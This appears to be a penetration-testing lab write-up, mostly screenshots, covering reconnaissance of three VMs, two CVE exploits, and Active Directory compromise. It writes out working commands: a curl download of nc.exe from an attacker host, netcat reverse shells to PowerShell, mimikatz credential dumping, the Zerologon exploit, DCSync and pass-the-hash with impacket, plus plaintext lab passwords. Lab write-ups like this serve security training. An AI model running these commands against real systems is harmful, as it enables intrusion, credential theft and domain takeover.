## Introduce

![image](_assets/Sy2B9LW3el.png)

## Reconnaissance
### 1. Port
* VM1

  ![image](_assets/BkSdi8W3xg.png)

  ![image](_assets/SJ8FoLWhxe.png)

* VM2

  ![image](_assets/BJeLF5wybe.png)

  ![image](_assets/r1o0sIZ3xe.png)

  ![image](_assets/BkcDY9wkbl.png)

  ![image](_assets/rygtY5Pkbe.png)

* VM3

  ![image](_assets/B17e6Ubhex.png)

  ![image](_assets/HJSbpLbhll.png)

  ![image](_assets/BktMpLW3le.png)

### Applications
* VM1
  1. Port 5989

     ![image](_assets/HJl3TIZhxg.png)

  2. Port 135 & 445

     ![image](_assets/HymrC8W2lg.png)

     ![image](_assets/rk_uAUb2xx.png)

     ![image](_assets/rJrf1v-2ee.png)

* VM2
  1. Port 5989

     ![image](_assets/BkUCyDbnxg.png)
  
  2. Port 135 & 445

     ![image](_assets/r1pHxDW2xe.png)

* VM3
  1. 8443

     ![image](_assets/HJmKfPWnlg.png)
    
  2. 5001

     ![image](_assets/SyaAePWnlg.png)
    
## Exploit
* CVE-2020-10189
`https://srcincite.io/pocs/src-2020-0011.py.txt`

  ![image](_assets/Hk6sow-hxg.png)

  ![image](_assets/HkCJnvb3eg.png)

  ![image](_assets/SkuQ1Fzage.png)

* CVE-2020-14008
`https://github.com/JackHars/cve-2020-14008`

  ![image](_assets/Hk9-Jtf6ge.png)

  ![image](_assets/B1YA8FMalg.png)

  ![image](_assets/Hk1fDKfael.png)

  ![image](_assets/SyKXPYfTeg.png)

* File Upload
`curl http://192.168.45.167:6600/nc.exe -o C:\Windows\Temp\nc.exe`
`C:\Windows\Temp\nc.exe 192.168.45.204 9963 -e powershell`
`xfreerdp3 /v:192.168.126.95 /u:dave2 /dynamic-resolution /d:secure.secura.yzx /p:password123\!`
`\\192.168.45.243\share\nc.exe 192.168.45.243 9963 -e powershell`

  ![image](_assets/rJC9FtzTxe.png)

## Lateral Movement in Active Directory
* BloodHound
`Import-Module .\Sharphound.ps1`
`Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Windows\Temp\bloodhound" -OutputPrefix "corp audit"`

  ![image](_assets/ByWbdPCpgl.png)

* mimikatz
    1. `sekurlsa::logonpasswords`

       ![image](_assets/S1lrvj7Agg.png)

* winPeas
`xfreerdp3 /v:192.168.126.95 /u:administrator /dynamic-resolution /d:secure.secura.yzx /p:Reality2Show4\!.\?`

  ![image](_assets/SyepOxBCeg.png)

## Zerologon Abuse
`privilege::debug`
`lsadump::zerologon /target:192.168.178.97 /account:dc01$`

![image](_assets/ryMaXyK1Zg.png)

`lsadump::zerologon /target:192.168.178.97 /account:dc01$ /exploit`

![image](_assets/BkU2LxF1Wl.png)

`lsadump::dcsync /domain:secura.yzx /dc:dc01 /user:Administrator /authuser:dc01$ /authdomain:main /authpassword:"" /authntlm`

![image](_assets/H1ovwgYJWl.png)

`impacket-wmiexec -hashes :d38e7c66048f80fd9566ab85afca76b1 secura/administrator@192.168.178.97`

![image](_assets/ByNxqxFkWl.png)

![image](_assets/H1WBjgKkbg.png)

![image](_assets/B1AHseKyWx.png)

`impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL`

![image](_assets/Bkj13eFyZg.png)

`python3 reinstall_original_pw.py dc01 192.168.178.97 aad3b435b51404eeaad3b435b51404ee`

![image](_assets/BkyWaltybl.png)

